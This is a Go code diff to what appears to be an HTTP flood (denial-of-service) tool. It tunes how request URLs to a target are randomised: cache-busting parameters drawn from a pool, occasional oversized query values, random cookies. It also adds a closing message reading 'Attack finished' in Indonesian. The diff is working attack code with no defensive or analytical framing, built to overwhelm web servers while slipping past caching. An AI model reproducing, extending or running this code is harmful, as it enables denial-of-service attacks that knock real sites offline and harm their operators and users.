@@ -299,23 +299,15 @@ func main() {
 						path := PATH_POOL[subRng.Intn(len(PATH_POOL))]
 						reqURL := tgt + path
 
-						reqURL += "?_=" + strconv.FormatInt(subRng.Int63(), 10)
+						param := CBP[subRng.Intn(len(CBP))]
+						if strings.Contains(reqURL, "?") {
+							reqURL += "&" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
+						} else {
+							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
+						}
 
-						// Tambahkan parameter acak dengan probabilitas tinggi
-						if subRng.Intn(3) != 0 {
-							reqURL += "&" + RST(subRng, 6) + "=" + RST(subRng, 10)
-						}
-						if subRng.Intn(2) == 0 {
-							reqURL += "&big=" + strings.Repeat("x", 2048+subRng.Intn(2048))
-						}
 						if subRng.Intn(5) == 0 {
-							reqURL += "&" + RST(subRng, 8) + "=" + strings.Repeat("y", 1024)
-						}
-						if subRng.Intn(4) == 0 {
-							reqURL += "&filter=" + url.QueryEscape(`{"field":"`+RST(subRng, 8)+`","op":"eq","value":"`+RST(subRng, 12)+`"}`)
-						}
-						if subRng.Intn(3) == 0 {
-							reqURL += "&sort=" + RST(subRng, 6) + "&order=" + []string{"asc", "desc"}[subRng.Intn(2)]
+							reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
 						}
 						if subRng.Intn(10) == 0 {
 							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
@@ -362,9 +354,6 @@ func main() {
 							if subRng.Intn(2) == 0 {
 								cookies = append(cookies, name+"="+strconv.FormatInt(subRng.Int63(), 16))
 							}
-						}
-						if subRng.Intn(3) == 0 {
-							cookies = append(cookies, "bigcookie="+strings.Repeat("z", 512+subRng.Intn(512)))
 						}
 						if len(cookies) > 0 {
 							req.Header.Set("Cookie", strings.Join(cookies, "; "))
@@ -413,5 +402,5 @@ func main() {
 	case <-ctx.Done():
 	}
 	wg.Wait()
-
+	fmt.Println("\nSerangan selesai.")
 }
